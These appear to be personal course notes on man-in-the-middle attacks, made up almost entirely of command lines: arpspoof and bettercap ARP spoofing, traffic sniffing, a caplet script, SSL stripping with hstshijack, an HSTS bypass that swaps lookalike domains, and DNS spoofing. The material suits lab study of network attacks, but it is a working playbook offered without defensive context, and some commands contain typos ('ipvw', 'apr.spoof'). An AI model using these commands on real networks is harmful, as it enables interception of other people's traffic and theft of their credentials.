# Command Line - ARP Spoofing (Address Resolution Protocol)
## Only works for HTTP (not HTTPS)
##
`arp -a`

`arpspoof -i <interface> -t <clientIP> <gatewayIP>`
`arpspoof -i <interface> -t <gatewayIP> <clientIP>`

`echo 1 > /proc/sys/net/ipvw/ip_forward`

# Bettercap - Arp Spoofing

## Basic bettercap commands
`bettercap -iface <interface>`
	`help`
	`help net.probe`
	`net.probe on`
	`help`
	`net.show`
## Spoofing
	`help apr.spoof`
### Change value of options in modules
	`set <module.option> <value>`
### Set Fullduplex true
	`set arp.spoof.fullduplex true`
### Setting Targets
	`set arp.spoof.targets <target-ips>`
	`set arp.spoof.targets 10.0.2.3`
### Turn ARPSPOOF ON
	`set arp.spoof on`
### Spying on Network Devices
	`net.sniff on`
## Caplets = 'script'
	Copy commands into .cap extension file
`bettercap -iface eth0 -caplet <caplet-file>`
	`caplets.show`

### spoof.cap file
net.probe on
net.recon on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.171,...<other-ips>
arp.spoof on
set net.sniff.local true
net.sniff on

# Bypassing HTTPS
# SSLSTRIP - Downgrades HTTPS to HTTP
Replace hstshijack file from udemy in /usr/share/bettercap/caplets
`bettercap -iface eth0 -caplet spoof.cap`
	`hstshijack/hstshijack`

## Not all websites will work. Some use HSTS. It sticktly accepts HTTPS.

# Bypassing HSTS - PARTIAL SOLUTION
## Trick the browser into loading a different website. facebook.com --> facebok.corn

## Set different replacements/websites
`gedit /usr/share/bettercap/caplets/hstshijack/hstshijack.cap`
If victim goes to HSTS websites through another website that doesn't use HSTS

## DNS Spoofing
`service apache2 start`
`bettercap -iface eth0 -caplet spoof.cap`
	`set dns.spoof.all true`
	`set dns.spoof.domains zsecurity.org,*.zsecurity.org`
	`dns.spoof on`










